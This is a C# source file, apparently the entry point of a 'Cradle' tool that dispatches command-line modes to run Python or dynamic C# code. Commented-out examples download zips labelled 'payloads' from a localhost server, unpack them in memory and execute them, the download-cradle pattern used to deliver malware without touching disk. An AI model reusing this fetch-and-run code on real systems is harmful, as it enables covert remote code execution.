using System;
using System.Linq;

namespace Cradle
{
    
    static class Program
    {

        [STAThread]
        static void Main(string[] args)
        {

            AssemblyUtil.SetAssemblyResolution();

            /* Example: Direct P/Invoke
            dynamic user32 = new DynamicDllImport("user32.dll", callingConvention: CallingConvention.Winapi);
            user32.MessageBox(0, "Hello World", "Platform Invoke Sample", 0);
            */

            /* Example: Run Ptyho DLR sript
             * String pystring = @"
import argparse
                
            ";
            dynamic pengine = IPythonUtil.GetEngine();
            dynamic pscope = IPythonUtil.GetNewScope();
            dynamic pythonScript;
            pythonScript = IPythonUtil.GetEngine().CreateScriptSourceFromString(pystring);
            pythonScript.Execute();
            //pythonScript.Execute(pscope);
            */

            /* Example: Serialize and pass objects 
            CommandMessageWriter.MsgWrite();
            CommandMessageReader.MsgRead();
            */

            
            /* foreach (var parameter in parameters)
            {
                Console.WriteLine("Index   : " + parameter.Index);
                Console.WriteLine("Bruto   : " + parameter.Bruto);
                Console.WriteLine("Netto   : [" + parameter.Netto + "]");
                Console.WriteLine("Key     : " + parameter.Key);
                Console.WriteLine("Value   : [" + (parameter.Value == null ? "<null>" : parameter.Value) + "]");
                Console.WriteLine("HasValue: " + parameter.HasValue);
                Console.WriteLine("");
            }

            var noValues = parameters.Where(p => !p.HasValue);
            foreach (var noValue in noValues)
            {
                Console.WriteLine("No value: " + noValue);
            }

            // By default case insensitive 
            var countryParameters = parameters.GetParameters("-country");
            foreach (var parameter in countryParameters)
            {
                Console.WriteLine(parameter.Key + ": " + parameter.Value);
            }
            Console.WriteLine("");

            foreach (var key in parameters.DistinctKeys)
            {
                Console.WriteLine("Key     : " + key);
            }

            Console.WriteLine("");
            Console.WriteLine("Index 2 : " + parameters[2].Value);

            Console.WriteLine("");
            Console.WriteLine("Index of: " + parameters.GetParameters("/space").First().Index);


            Console.WriteLine(parameters.HasKey("/space")); // true 
            Console.WriteLine(parameters.GetFirstValue("/Space")); // " "
            Console.WriteLine(parameters.HasKeyAndValue("/Empty")); // true
            Console.WriteLine(parameters.HasKeyAndNoValue("-IsNiceCountry")); // true

            */

            var parameters = new ParametersParser();

            if ( !parameters.HasKeyAndValue("-mode") )
            {
                GeneralUtil.Usage("Option  [-mode=<value>]  is required");

            }else{
                String mode = parameters.GetFirstValue("-mode");
                switch ( mode.ToLower() )
                {
                    case "console" :
                    case "con" :
                    case "c" :
                        OptionStarter.ModeConsole();
                        break;
                    case "exec":
                        if (parameters.HasKeyAndValue("-type") 
                            && parameters.HasKeyAndValue("-resource") 
                            && parameters.HasKeyAndValue("-method") 
                            && parameters.GetFirstValue("-type") != String.Empty
                            && parameters.GetFirstValue("-resource") != String.Empty
                            && parameters.GetFirstValue("-method") != String.Empty)
                        {
                            String type = parameters.GetFirstValue("-type");
                            String resource = parameters.GetFirstValue("-resource");
                            String method = parameters.GetFirstValue("-method");
                            switch (type.ToLower())
                            {
                                case "python" :
                                case "py" :
                                    Console.WriteLine("Python DLR");
                                    OptionStarter.ModePyExec(resource, method);
                                    break;
                                case "csharp" :
                                case "cs" :
                                    Console.WriteLine("Dynamic CS");
                                    OptionStarter.ModeCSExec(resource, method);
                                    break;
                                default:
                                    GeneralUtil.Usage("Unknown type of EXEC: " + type);
                                    break;
                            }
                        }else
                        {
                            GeneralUtil.Usage("Specify proper -type, -resource, -method to get to the resource");
                        }
                        break;
                    case "pyrepl":
                        if (parameters.HasKeyAndValue("-type"))
                        {
                            String type = parameters.GetFirstValue("-type");
                            switch ( type.ToLower())
                            {
                                case "single" :
                                case "s" :
                                    OptionStarter.ModePyRepl("single");
                                    break;
                                case "multi" :
                                case "m" :
                                    OptionStarter.ModePyRepl("multi");
                                    break;
                                default:
                                    GeneralUtil.Usage("Unknown type of PyREPL " + type);
                                    break;
                            }

                        }else
                        {
                            GeneralUtil.Usage("Specify type of PyREPL ");
                        }
                        break;
                    case "csrepl" :
                        if (parameters.HasKeyAndValue("-type"))
                        {
                            String type = parameters.GetFirstValue("-type");
                            switch (type.ToLower())
                            {
                                case "dyncs":
                                case "d":
                                    OptionStarter.ModeCSRepl("dyncs");
                                    break;
                                case "pydlr":
                                case "l":
                                    OptionStarter.ModeCSRepl("pydlr");
                                    break;
                                default:
                                    GeneralUtil.Usage("Unknown type of CSREPL " + type);
                                    break;
                            }

                        }
                        else
                        {
                            GeneralUtil.Usage("Specify type of CsREPL ");
                        }
                        break;
                    default:
                        GeneralUtil.Usage("Unknown mode " + mode);
                        break;
                }

            }


            /* Example: Load Python scripts over network, Unzip in memory and run


                        WebClient wc = new WebClient();
                        Console.WriteLine("Getting IPY payloads ...");
                        byte[] scriptzip = wc.DownloadData(@"http://127.0.0.1:8000/ippayloads.zip");


                        // Load network bytes into memory stream and unzip in memory.
                        Stream zipdata = new MemoryStream(scriptzip);
                        Stream unzippedDataStream;
                        ZipArchive archive = new ZipArchive(zipdata, ZipArchiveMode.Read);

                        foreach (ZipArchiveEntry entry in archive.Entries)
                        {

                            if (entry.FullName == @"ppt.py")
                            {
                                Console.WriteLine("Unzipped File: {0}", entry.Name);
                                unzippedDataStream = entry.Open();

                                StreamReader reader = new StreamReader(unzippedDataStream);
                                string codeText = reader.ReadToEnd();
                                pythonScript = pengine.CreateScriptSourceFromString(codeText);
                                Console.WriteLine("Executing Source >>>  {0} <<< ...", codeText.Substring(0,
                                                                    (codeText.Length >= 80) ? 79 : codeText.Length));
                                pythonScript.Execute();
                            }

                        }
            */



            /*
            WebClient wc = new WebClient();
            Console.WriteLine("Getting C# Code payloads ...");
            byte[] dllzip = wc.DownloadData(@"http://127.0.0.1:8000/InteropUtil.zip");

            Dictionary<String, MemoryMappedFile> mmfRepo = new Dictionary<String, MemoryMappedFile>();

            // Load network bytes into memory stream and unzip in memory.
            Stream dllzipdata = new MemoryStream(dllzip);
            ZipArchive dllarchive = new ZipArchive(dllzipdata, ZipArchiveMode.Read);

            Stream unzippedCSDataStream;
            MemoryMappedFile mmf;
            foreach (ZipArchiveEntry entry in dllarchive.Entries)
            {
                if (entry.Name == @"InteropUtil.cs")
                {
                    Console.WriteLine("Unzipped CSharp: {0}", entry.Name);
                    unzippedCSDataStream = entry.Open();
                    // Prepare Memory Map for file
                    mmf = MemoryMappedFile.CreateNew(entry.Name, entry.Length);

                    // Save mmf
                    mmfRepo.Add(entry.Name, mmf);


                    StreamReader reader = new StreamReader(unzippedCSDataStream);
                    string codeText = reader.ReadToEnd();
                    //Console.WriteLine("Code text: {0}", codeText);

                    byte[] Buffer = ASCIIEncoding.ASCII.GetBytes(codeText);
                    using (MemoryMappedViewStream stream = mmf.CreateViewStream())
                    {
                        BinaryWriter writer = new BinaryWriter(stream);
                        writer.Write(Buffer);
                    }
                }
            }
            */
        }


    }
}
